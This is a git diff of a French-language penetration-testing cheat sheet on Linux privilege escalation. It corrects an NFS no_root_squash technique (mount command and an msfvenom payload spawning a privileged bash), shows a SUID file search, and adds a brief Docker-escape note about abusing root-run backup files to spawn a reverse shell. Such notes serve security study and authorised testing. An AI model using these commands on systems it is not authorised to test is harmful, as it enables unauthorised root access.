@@ -271,7 +271,7 @@ on doit run en tant que root donc :
 ```bash
 sudo su
 mkdir /tmp/nfs
-mount -o rw,vers=2 <targetIP>:/tmp /tmp/nfs
+mount -o rw,vers=2 -v -t nfs <targetIP>:/<targetpath> /tmp/nfs
 ```
 on crée un payload qui pop un simple bash
 ```bash
@@ -280,7 +280,7 @@ chmod +x /tmp/nfs/shell.elf
 ```
 Sur la target :
 ```bash
-msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf4
+msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
 ```
 
 ### LD_PRELOAD : 
@@ -460,6 +460,14 @@ append user at end of root:x:0:<UTILISATEUR>
 ```bash
 find / -perm -u=s -type f 2>/dev/null
 ```
+
+## Docker escape
+To check if you're in a docker, type `hostame`.  
+If the response is weird stuff, you are probably in.  
+
+- One method is to check for backup files that are run as original root  
+It will require to have privileges to write on vulnerable files  
+Spawn a regular bash reverse shell
 
 ### PATH Variable
 ### ssh private key
